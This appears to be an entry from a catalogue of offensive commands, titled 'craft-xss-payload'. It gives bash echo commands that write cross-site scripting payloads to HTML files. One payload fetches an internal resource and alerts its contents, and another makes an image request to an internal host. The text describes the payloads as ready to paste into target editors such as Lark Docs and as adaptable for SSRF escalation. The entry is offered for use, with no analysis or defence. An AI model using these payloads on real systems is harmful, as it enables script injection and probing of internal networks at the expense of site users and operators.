---
data: >-
  echo '<script>fetch("http://internal-resource").then(r => r.text()).then(data
  => alert(data));</script>' > payload.html
tags:
  - xss
  - payload
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:19.919Z'
id: 0ad81866-9cef-47aa-9e5f-ac4618ba3da0
verified: false
validated: true
submitted: true
---
# craft-xss-payload

## Command

```bash
echo '<script>fetch("http://internal-resource").then(r => r.text()).then(data => alert(data));</script>' > payload.html
```

## Description

This command generates a basic XSS payload file using echo, suitable for injection into web forms or documents like Lark Docs. It creates a script that fetches a resource and alerts the response, adaptable for SSRF escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo` | Outputs the string to file | Yes |
| `<script>...</script>` | The JavaScript payload | Yes |
| `> payload.html` | Redirects output to file | Yes |

## Examples

### Basic Usage

```bash
echo '<script>alert("XSS")</script>' > test.html
```

### Advanced Usage

```bash
echo '<script>var x=new Image();x.src="http://internal/";</script>' > ssrf.html
```

## Expected Output

A file `payload.html` containing the script tag, ready for copy-paste into the target editor.

## Related

- [[Related Procedure]]
